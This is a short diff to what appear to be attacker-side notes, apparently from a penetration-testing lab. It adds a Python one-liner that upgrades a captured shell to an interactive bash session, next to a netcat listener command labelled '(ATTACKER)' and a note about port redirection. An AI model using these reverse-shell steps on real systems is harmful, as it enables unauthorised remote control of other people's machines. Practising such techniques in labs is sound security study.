@@ -6,6 +6,7 @@ make sure Redirect target port is 22
 
 listner is netcat
 
+(upgrade) python -c 'import pty; pty.spawn("/bin/bash")'
 
 (ATTACKER) nc -lvp 55556
 
